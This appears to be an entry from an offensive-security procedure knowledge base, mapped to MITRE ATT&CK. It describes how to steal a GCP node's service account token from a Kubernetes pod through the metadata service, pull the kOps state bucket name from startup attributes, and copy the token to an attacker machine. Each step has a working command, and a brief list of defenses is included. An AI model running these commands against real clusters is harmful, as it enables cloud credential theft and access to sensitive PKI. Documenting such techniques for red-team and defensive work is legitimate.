---
id: proc-2
name: Retrieve-GCP-Metadata-Token-and-Bucket-Name
tags:
  - gcp
  - metadata-service
  - token-theft
type: procedure
tools:
  - '[[tools/wget]]'
  - '[[tools/kubectl]]'
tactics:
  - '[[Discovery]]'
commands:
  - '[[commands/wget-metadata-token]]'
  - '[[commands/wget-startup-script-grep]]'
  - '[[commands/kubectl-cp-token]]'
verified: false
platforms:
  - GCP
  - Linux
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Cloud Instance Metadata API]]'
updated_at: '2025-12-14T17:30:18.578Z'
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Discovery]]'
mitre_techniques:
  - '[[Cloud Instance Metadata API]]'
---
# Retrieve-GCP-Metadata-Token-and-Bucket-Name

## Summary

From a pod shell, queries the GCP metadata service to steal the node's service account token and parse the state bucket name from startup attributes.

## Description

GCP instances expose metadata via http://metadata.google.internal, accessible from pods on the host. This procedure fetches the default service account token (with Storage access) and extracts the kOps state bucket from the startup-script attribute, enabling access to sensitive PKI.

## Requirements

1. Shell in pod on GCP node
2. wget available in pod image
3. Cluster state bucket configured (e.g., gs://kops-state-test/)

## Defense

- Attach minimal IAM roles to node service accounts (no Storage Owner)
- Disable metadata server access from pods via network policies
- Audit metadata queries in GCP logs

## Objectives

1. Obtain access token for GCS
2. Identify state bucket path
3. Transfer token to attacker machine

## Instructions

### Step 1: Fetch Service Account Token

**Context**: Download the JSON token from metadata service.

**Command** ([[commands/wget-metadata-token]]):
```bash
wget --header 'Metadata-Flavor: Google' http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token -O default.token
```

> Saves token JSON. Expected output: File with access_token and expiry.

### Step 2: Extract Bucket Name from Startup Script

**Context**: Parse attributes for ConfigBase containing bucket info.

**Command** ([[commands/wget-startup-script-grep]]):
```bash
wget --header 'Metadata-Flavor: Google' http://metadata.google.internal/computeMetadata/v1/instance/attributes/startup-script -O- | grep ConfigBase
```

> Outputs line with bucket (e.g., kops-state-test). Expected output: Filtered ConfigBase path.

### Step 3: Copy Token to Host

**Context**: Transfer file from pod to local machine.

**Command** ([[commands/kubectl-cp-token]]):
```bash
k cp shell-5d64dd647c-8l8s6:/default.token default.token
```

> Copies file. Expected output: Local default.token created.

## MITRE ATT&CK Mapping

### Tactics

- [[Discovery]] Discovery

### Techniques

- [[Cloud Instance Metadata API]] Unsecured Credentials: Cloud Instance Metadata API

### Sub-Techniques

- None

## Commands Used

- [[commands/wget-metadata-token]]
- [[commands/wget-startup-script-grep]]
- [[commands/kubectl-cp-token]]

## Tools Used

- [[tools/wget]]
- [[tools/kubectl]]

## Tags

- gcp
- metadata-service
- token-theft
